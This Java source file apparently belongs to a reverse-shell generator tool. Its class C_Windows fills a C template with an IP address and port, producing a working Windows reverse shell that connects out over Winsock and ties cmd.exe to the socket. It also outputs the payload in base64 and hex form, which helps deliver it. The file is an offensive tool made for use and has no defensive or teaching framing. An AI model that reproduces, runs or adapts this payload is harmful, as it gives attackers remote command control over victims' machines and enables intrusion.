package com.iteso.ReverseShellGenerator.Reverse.Shells;
import com.iteso.ReverseShellGenerator.DEncoder;
import com.iteso.ReverseShellGenerator.Reverse.Reverse;

public class C_Windows extends Reverse {

    protected String shellFormat = "";

    public C_Windows(String localIP, int localPort, LISTENER listener, SHELLS shellType){
        super(localIP, localPort, listener, shellType);
        shellFormat = String.format("#include <winsock2.h>\r\n#include <stdio.h>\r\n#pragma comment(lib,\"ws2_32\")\r\n\r\nWSADATA wsaData;\r\nSOCKET Winsock;\r\nstruct sockaddr_in hax; \r\nchar ip_addr[16] = \"%s\"; \r\nchar port[6] = \"%s\";            \r\n\r\nSTARTUPINFO ini_processo;\r\n\r\nPROCESS_INFORMATION processo_info;\r\n\r\nint main()\r\n{\r\n    WSAStartup(MAKEWORD(2, 2), &wsaData);\r\n    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);\r\n\r\n\r\n    struct hostent *host; \r\n    host = gethostbyname(ip_addr);\r\n    strcpy_s(ip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)));\r\n\r\n    hax.sin_family = AF_INET;\r\n    hax.sin_port = htons(atoi(port));\r\n    hax.sin_addr.s_addr = inet_addr(ip_addr);\r\n\r\n    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);\r\n\r\n    memset(&ini_processo, 0, sizeof(ini_processo));\r\n    ini_processo.cb = sizeof(ini_processo);\r\n    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; \r\n    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;\r\n\r\n    TCHAR cmd[255] = TEXT(\"cmd.exe\");\r\n\r\n    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);\r\n\r\n    return 0;\r\n}", this.getLocalIP(), this.getLocalPort());
    }

    @Override
    public String getShellCode(){
        return shellFormat;
    }

    @Override
    public String toString(){
        return "{" + "\"parameters\": " + super.toString() + "," +
                    "\"reverse_listener_code\": " + "\"" + super.getListenerCode() + "\"," +
                    "\"reverse_shell_code\": " + "\"" + getShellCode() + "\"," +
                    "\"reverse_shell_code_b64\": " + "\"" + DEncoder.encodeToBase64(getShellCode()) + "\"," +
                    "\"reverse_shell_code_hex\": " + "\"" + DEncoder.encodeToHex(getShellCode()) + "\"" +
                "}";
    }
    
} 
    
